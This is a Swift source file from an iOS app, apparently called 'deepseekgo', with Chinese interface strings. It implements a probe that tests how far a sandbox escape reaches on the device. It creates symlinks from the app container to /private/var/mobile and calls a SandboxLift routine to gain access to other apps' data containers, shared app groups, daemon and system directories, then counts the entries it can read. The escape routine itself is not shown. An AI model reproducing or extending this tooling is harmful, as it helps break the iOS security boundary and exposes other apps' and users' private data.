import Foundation

/// On-device capability probe. Run with `deepseekgo --lift-probe`, or from the
/// 设备文件 screen, to see exactly how far the sandbox escape actually gets on
/// the OS build you are holding instead of trusting a README table.
public enum SandboxLiftProbe {
    public struct Line: Sendable {
        public let title: String
        public let detail: String
        public let ok: Bool
    }

    @available(iOS 17.0, *)
    public static func run() -> [Line] {
        var out: [Line] = []
        let fm = FileManager.default
        let version = ProcessInfo.processInfo.operatingSystemVersion
        out.append(Line(title: "iOS", detail: "\(version.majorVersion).\(version.minorVersion).\(version.patchVersion)",
                        ok: true))

        let groupURL = fm.containerURL(forSecurityApplicationGroupIdentifier: SandboxLift.appGroupID)
        out.append(Line(title: "App Group", detail: groupURL?.path ?? "无（entitlement 未生效）", ok: groupURL != nil))

        let appContainer = NSHomeDirectory()
        out.append(Line(title: "本机容器", detail: appContainer, ok: true))

        // 1) symlink capability in each writable area — the escape lives or dies here
        let container = NSHomeDirectory()
        let linkTests: [(String, String)] = [
            ("Library/Caches 本体", container + "/Library/Caches"),
            ("Library 内新建链接", container + "/Library/_probe_link"),
            ("Documents 内新建链接", container + "/Documents/_probe_link"),
            ("tmp 内新建链接", container + "/tmp/_probe_link")
        ]
        for (name, path) in linkTests {
            try? fm.removeItem(atPath: path)
            do {
                try fm.createSymbolicLink(atPath: path, withDestinationPath: "/private/var/mobile")
                out.append(Line(title: "symlink \(name)", detail: "成功", ok: true))
                try? fm.removeItem(atPath: path)
            } catch {
                out.append(Line(title: "symlink \(name)",
                                detail: (error as NSError).code.description + " · " + error.localizedDescription,
                                ok: false))
            }
        }

        let targets = [
            "/var/mobile/Containers/Data/Application",
            "/var/mobile/Containers/Shared/AppGroup",
            "/var/mobile/Containers/Data/InternalDaemon",
            "/var/containers/Data/System"
        ]

        for target in targets {
            for (label, cls) in [("appGroup", UInt64(7)), ("app", UInt64(1))] {
                let report = SandboxLift.shared.lift(target, containerClass: cls)
                if report.ok {
                    let visible = (try? fm.contentsOfDirectory(atPath: target).count) ?? -1
                    out.append(Line(title: "\(label) → \(target)",
                                    detail: "handle \(report.handle) · 可读条目 \(visible)",
                                    ok: visible >= 0))
                    SandboxLift.shared.release(report.handle)
                } else {
                    out.append(Line(title: "\(label) → \(target)",
                                    detail: "code \(report.code) · \(report.note.isEmpty ? report.label : report.note)",
                                    ok: false))
                }
            }
        }
        return out
    }

    @available(iOS 17.0, *)
    public static func log() {
        for line in run() {
            let text = "[LIFT] \(line.ok ? "OK  " : "FAIL") \(line.title) :: \(line.detail)"
            print(text)
            NSLog("%@", text)
        }
    }
}
